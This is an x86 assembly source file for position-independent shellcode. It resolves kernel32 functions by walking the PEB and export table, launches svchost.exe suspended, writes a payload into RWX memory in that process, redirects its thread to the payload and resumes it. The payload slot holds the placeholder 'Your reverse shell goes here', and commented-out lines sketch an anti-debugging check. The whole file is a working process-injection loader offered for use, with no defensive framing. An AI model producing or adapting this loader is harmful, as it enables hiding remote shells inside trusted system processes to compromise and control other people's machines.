.686p 
.xmm
.model flat,c
.stack 4096


; include C libraries
includelib      msvcrtd

.code
        
public  main

main proc

    ; define local variables
    
    addrExitProcess= dword ptr -390h
    exitprocessStr= dword ptr -38Ch

    addrShell= dword ptr -388h
    addrContext= dword ptr -384h
    addrOld= dword ptr -0B8h
    addrPI= dword ptr -0B4h
    addrSI= dword ptr -0A4h

    addrAllocatedMemory= dword ptr -60h
    name_pointer_table_addr= dword ptr -5Ch
    address_table_addr= dword ptr -58h
    ordinal_table_addr= dword ptr -54h
    addr_of_loadLibraryA= dword ptr -50h
    addr_of_getProcAddress= dword ptr -4Ch

    addrResumeThread= dword ptr -48h
    addrSetThreadContext= dword ptr -44h
    addrGetThreadContext= dword ptr -40h
    addrVirtualProtectEx= dword ptr -3Ch 
    addrCreateProcessA= dword ptr -38h
    addrWriteProcessMemory= dword ptr -34h
    addrVirtualAllocEx= dword ptr -30h

    svchostStr= dword ptr -2Ch
    resumeThreadStr= dword ptr -28h
    setThreadContextStr= dword ptr -24h
    getThreadContextStr= dword ptr -20h
    virtualProtectExStr= dword ptr -1Ch
    createProcessAStr= dword ptr -18h
    writeProcessMemoryStr= dword ptr -14h 
    virtualAllocExStr= dword ptr -10h
    getProcAddressStr= dword ptr -0Ch
    LoadLibraryAstr= dword ptr -08h
    krnl32_image_base= dword ptr -04h

    push eax ; Save all registers
    push ebx
    push ecx
    push edx
    push esi
    push edi

    push ebp
	mov ebp, esp
	sub esp, 390h 			; Allocate memory on stack for local variables

    
    call find_shellcode_real_address    ; makes rip (curr instruction register) get pushed to the stack

    find_shellcode_real_address:
        pop     edi    ; store address of shellcode
    
    mov     esi, offset find_shellcode_real_address    ; store "fake" address of shellcode

    mov	    eax, LABEL_STR_LOADLIBRARYA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + loadLibraryAstr], eax    ; name LoadLibraryA

    mov	    eax, LABEL_STR_GETPROCADDRESS     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + getProcAddressStr], eax    ; name GetProcAddress

    mov	    eax, LABEL_STR_VIRTUALALLOCEX     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + virtualAllocExStr], eax    ; name virtualAllocEx

    mov	    eax, LABEL_STR_WRITEPROCESSMEMORY     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + writeProcessMemoryStr], eax    ; name writeProcessMemory

    mov	    eax, LABEL_STR_CREATEPROCESSA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + createProcessAStr], eax    ; name createProcessA

    mov	    eax, LABEL_STR_VIRTUALPROTECTEX     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + virtualProtectExStr], eax    ; name virtualProtectEx

    mov	    eax, LABEL_STR_GETTHREADCONTEXT     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + getThreadContextStr], eax    ; name getThreadContext

    mov	    eax, LABEL_STR_SETTHREADCONTEXT     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + setThreadContextStr], eax    ; name setThreadContext

    mov	    eax, LABEL_STR_RESUMETHREAD     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + resumeThreadStr], eax    ; name resumeThread

    mov	    eax, LABEL_STR_SVCHOST    ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + svchostStr], eax    ; name svchost

    mov     eax, LABEL_STR_SHELL
    sub     eax, esi
    add     eax, edi
    mov     [ebp + addrShell], eax

    mov     eax, LEBEL_STR_EXITPROCESS 
    sub     eax, esi
    add     eax, edi
    mov     [ebp + exitprocessStr], eax
    
    ; no need for real and fake address of shellcode anymore, since we finished with constants
    
    ASSUME fs:nothing

    mov     eax, fs:[30h]     ; Get pointer to PEB

    ASSUME FS:ERROR

    ; TODO - mov     edx, [eax + 2h]
    ; TODO - cmp     edx, 1 ; check if being debugged
    ; TODO - jz      MAIN_END ; if being debugged, end

    mov     eax, [eax + 0Ch]    ; Get pointer to PEB_LDR_DATA
    mov     eax, [eax + 14h]    ; Get pointer to first entry in InMemoryOrderModuleList
    mov     eax, [eax]  ; Get pointer to second (ntdll.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax]   ; Get pointer to third (kernel32.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax + 10h]    ; Get kernel32.dll image base
    mov     [ebp + krnl32_image_base], eax ; save image base

    add     eax, [eax + 3Ch]    ; get to e_lfanew
    mov     eax, [eax + 78h]    ; get RVA of DataDirectory[0] - exports directory 
    add     eax, [ebp + krnl32_image_base]     ; add image base get to DataDirectory[0] - exports directory
    
    ; Now, as eax contains the address of DataDirectory[0], we can traverse it to find what we need

    mov     ebx, [eax + 1Ch]    ; get RVA of address table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to address table
    mov     [ebp + address_table_addr], ebx

    mov     ebx, [eax + 20h]    ; get RVA of name pointer table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to name pointer table
    mov     [ebp + name_pointer_table_addr], ebx

    mov     ebx, [eax + 24h]    ; get RVA of ordinals table
    add     ebx, [ebp + krnl32_image_base]     ; add image base to get to ordinals table
    mov     [ebp + ordinal_table_addr], ebx

    mov     edx, [eax + 14h]    ; number of exported functions

    xor     eax, eax   ; reset counter to 0

    LOOP_TO_FIND_LOADLIBRARYA:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + LoadLibraryAstr]     ; name LoadLibraryA
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + krnl32_image_base] ; add image base
        mov     ecx, lenLoadLibraryAstr
        repe    cmpsb     ; compare the first (length of LoadLibraryA) bytes

        jz FOUND_LOADLIBRARYA

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_LOADLIBRARYA

        FOUND_LOADLIBRARYA:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]    ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + krnl32_image_base]    ; get to address of function
            mov     [ebp + addr_of_loadLibraryA], eax
    
    
    xor     eax, eax    ; reset counter to 0

    LOOP_TO_FIND_GETPROCADDRESS:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + getProcAddressStr]     ; name GetProcAddress
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + krnl32_image_base] ; add image base
        mov     ecx, lenGetProcAddressStr
        repe    cmpsb     ; compare the first (length of GetProcAddress) bytes

        jz FOUND_GETPROCADDRESS

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_GETPROCADDRESS

        FOUND_GETPROCADDRESS:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]     ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + krnl32_image_base]    ; get to address of function
            mov     [ebp + addr_of_getProcAddress], eax

    USE_FUNCTIONS:
        
        ; Find addresses of functions: VirtualAllocEx, WriteProcessMemory, OpenProcess, VirtualProtectEx, GetThreadContext, SetThreadContext, ResumeThread
        ; Every function in KERNEL32.dll

        ; Get address of VirtualAllocEx

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + virtualAllocExStr]      ; name virtualAllocEx
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrVirtualAllocEx], eax

        ; Get address of ExitProcess

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + exitprocessStr]
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrExitProcess], eax

        ; Get address of WriteProcessMemory

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + writeProcessMemoryStr]      ; name writeProcessMemory
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrWriteProcessMemory], eax

        ; Get address of CreateProcessA

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + createProcessAStr]      ; name createProcessA
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrCreateProcessA], eax

        ; Get address of VirtualProtectEx

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + virtualProtectExStr]      ; name virtualProtectEx
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrVirtualProtectEx], eax

        ; Get address of GetThreadContext

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + getThreadContextStr]      ; name getThreadContext
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrGetThreadContext], eax

        ; Get address of SetThreadContext

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + setThreadContextStr]      ; name setThreadContext
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrSetThreadContext], eax

        ; Get address of ResumeThread

        mov     eax, [ebp + addr_of_getProcAddress]
        push    [ebp + resumeThreadStr]      ; name resumeThread
        push    [ebp + krnl32_image_base]     ; the handle of kernel32.dll
        call    eax     ; Call GetProcAddress
        mov     [ebp + addrResumeThread], eax

        ; call CreateProcessA
        mov eax, [ebp + addrCreateProcessA] ; CreateProcessA call
        
        ; zero PI and SI structs
        mov ecx, 15h ; 54h (44h + 10h) / 4
        ZERO_MEMORY:
            mov [ebp + addrPI + ecx * 4], 0
            loop ZERO_MEMORY

        lea edx, [ebp + addrPI] ; load PI struct's addr
        push edx
        lea edx, [ebp + addrSI] ; load SI struct's addr
        push edx

        push 0 ; lpCurrentDirectory - NULL
        push 0 ; lpEnvironment - NULL
        push 4 ; dwCreationFlags - CREATE_SUSPENDED
        push 1 ; bInheritHandles - True
        push 0 ; lpThreadAttributes - NULL
        push 0 ; lpProcessAttributes - NULL
        push 0 ; cmdline - NULL
        push [ebp + svchostStr] ; svchost.exe process path
        
        call eax ; call CreateProcessA

        ; call VirtualAllocEx
        mov eax, [ebp + addrVirtualAllocEx] ; VirtualAllocEx call

        push 40h ; PAGE_EXECUTE_READWRITE
        push 3000h ; MEM_COMMIT | MEM_RESERVE
        push lenShellStr
        push 0
        push [ebp + addrPI]

        call eax ; call VirtualAllocEx
        mov [ebp + addrAllocatedMemory], eax ; get the returned address from allocating

        ; call VirtualProtectEx
        mov eax, [ebp + addrVirtualProtectEx] ; VirtualProtectEx call

        lea edx, [ebp + addrOld] ; load old permissions addr
        push edx ; push old permissions addr

        push 40h ; PAGE_EXECUTE_READWRITE
        push lenShellStr
        push [ebp + addrAllocatedMemory] ; allocated memory
        push [ebp + addrPI]

        call eax ; call VirtualProtectEx

        ; call WriteProcessMemory
        mov eax, [ebp + addrWriteProcessMemory] ; WriteProcessMemory call

        push 0 ; lpNumberOfBytesWritten - NULL
        push lenShellStr

        push [ebp + addrShell]

        push [ebp + addrAllocatedMemory] ; allocated memory
        push [ebp + addrPI]

        call eax ; call WriteProcessMemory

        ; call GetThreadContext
        mov eax, [ebp + addrGetThreadContext] ; GetThreadContext call

        mov [ebp + addrContext], 1003Fh; set Context flags to CONTEXT_ALL
        lea edx, [ebp + addrContext] ; load Context's addr
        push edx ; push loaded addr

        push [ebp + addrPI + 4] ; lpProcessInfo.hThread

        call eax ; call GetThreadContext

        mov edx, [ebp + addrAllocatedMemory] ; set the memory allocated to edx
        mov [ebp + addrContext + 0B8h], edx ; modifing Context EIP to shellcode

        ; call SetThreadContext
        mov eax, [ebp + addrSetThreadContext] ; SetThreadContext call

        lea edx, [ebp + addrContext] ; load Context's addr
        push edx ; push loaded addr

        push [ebp + addrPI + 4] ; lpProcessInfo.hThread

        call eax ; call SetThreadContext

        ; call ResumeThread
        mov eax, [ebp + addrResumeThread] ; ResumeThread call
        
        push [ebp + addrPI + 4] ; lpProcessInfo.hThread

        call eax ; call ResumeThread

        ; call ExitProcess

        mov     eax, [ebp + addrExitProcess]
        push    0 ; EXIT_SUCCESS

        call eax ; call ExitProcess

    MAIN_END:

    add     esp, 390h 

    pop ebp 		; restore all registers and exit
	pop edi
    pop esi
	pop edx
	pop ecx
	pop ebx
	pop eax

	retn

    ; String constants

    LABEL_STR_LOADLIBRARYA:
        loadLibraryAstrInLabel db "LoadLibraryA", 0
        lenLoadLibraryAstr equ $ - loadLibraryAstrInLabel

    LABEL_STR_GETPROCADDRESS:
        getProcAddressStrInLabel db "GetProcAddress", 0
        lenGetProcAddressStr equ $ - getProcAddressStrInLabel

    LABEL_STR_VIRTUALALLOCEX:
        virtualAllocExStrInLabel db "VirtualAllocEx", 0
        lenVirtualAllocExStr equ $ - virtualAllocExStrInLabel

    LABEL_STR_WRITEPROCESSMEMORY:
        writeProcessMemoryStrInLabel db "WriteProcessMemory", 0
        lenWriteProcessMemoryStr equ $ - writeProcessMemoryStrInLabel

    LABEL_STR_CREATEPROCESSA:
        createProcessAStrInLabel db "CreateProcessA", 0
        lenCreateProcessAStr equ $ - createProcessAStrInLabel

    LABEL_STR_VIRTUALPROTECTEX:
        virtualProtectExStrInLabel db "VirtualProtectEx", 0
        lenVirtualProtectExStr equ $ - virtualProtectExStrInLabel

    LABEL_STR_GETTHREADCONTEXT:
        getThreadContextStrInLabel db "GetThreadContext", 0
        lenGetThreadContextStr equ $ - getThreadContextStrInLabel

    LABEL_STR_SETTHREADCONTEXT:
        setThreadContextStrInLabel db "SetThreadContext", 0
        lenSetThreadContextStr equ $ - setThreadContextStrInLabel

    LABEL_STR_RESUMETHREAD:
        resumeThreadStrInLabel db "ResumeThread", 0
        lenResumeThreadStr equ $ - resumeThreadStrInLabel

    LABEL_STR_SVCHOST:
        svchostStrInLabel db "C:\\Windows\\System32\\svchost.exe", 0
        lenSvchostStr equ $ - svchostStrInLabel

    LABEL_STR_SHELL:
	    db "Your reverse shell goes here", 0
        lenShellStr equ $ - LABEL_STR_SHELL

    LEBEL_STR_EXITPROCESS:
        exitprocessStrInLabel db "ExitProcess", 0
        lenExitProcessStr equ $ - exitprocessStrInLabel
        

main endp

        end